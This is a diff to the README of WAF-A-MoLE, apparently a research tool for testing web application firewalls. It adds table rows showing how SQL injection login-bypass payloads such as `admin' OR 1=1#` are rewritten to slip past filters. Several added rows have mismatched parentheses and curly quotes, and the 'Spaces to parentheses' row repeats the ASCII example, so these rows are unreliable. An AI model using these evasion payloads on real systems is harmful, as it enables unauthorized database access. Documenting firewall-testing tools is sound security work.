@@ -35,6 +35,15 @@ Below are the mutation operators available in the current version of WAF-A-MoLE.
 | Operator Swapping | `admin' OR 1=1#` ⇒ `admin' OR 1 LIKE 1#`|
 | Logical Invariant | `admin' OR 1=1#` ⇒ `admin' OR 1=1 AND 0<1#`|
 | Number Shuffling | `admin' OR 1=1#` ⇒ `admin' OR 2=2#`|
+| ASCII Encoding | `admin' OR 35<107#` ⇒ `admin' OR ASCII('#')<ASCII('k')#`|
+| Bitwise OR | `admin’ OR 3<9# ⇒ admin’ OR (2|1)<9)#`|
+| Bitwise AND | `admin’ OR 3<9# ⇒ admin’ OR (3&7)<9)#`|
+| Bitwise XOR | `admin’ OR 3<9# ⇒ admin’ OR (5^6)<9)#`|
+| Bitwise negation | `admin’ OR 3<9# ⇒ admin’ OR ~(-4)<9)#`|
+| Bitwise leftshift | `admin’ OR 4<9# ⇒ admin’ OR (2<<1))<9)#`|
+| Bitwise rightshift | `admin’ OR 3<9# ⇒ admin’ OR (7>>1))<9)#`|
+| AS omission | `’unioN select a as b# ⇒ ’unioN select a b#`|
+| Spaces to parentheses | `admin' OR 35<107#` ⇒ `admin' OR ASCII('#')<ASCII('k')#`|
 
 # How to cite us
 
